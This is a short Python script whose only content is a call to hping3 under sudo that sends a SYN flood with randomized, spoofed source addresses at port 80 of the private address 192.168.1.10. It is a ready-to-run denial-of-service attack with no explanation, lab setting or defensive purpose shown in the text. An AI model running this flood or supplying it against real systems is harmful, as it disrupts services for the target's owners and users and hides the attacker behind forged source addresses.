#!/usr/bin/python

import os

cmd = 'sudo hping3 -S 192.168.1.10 -p 80 --flood --rand-source'
os.system(cmd)

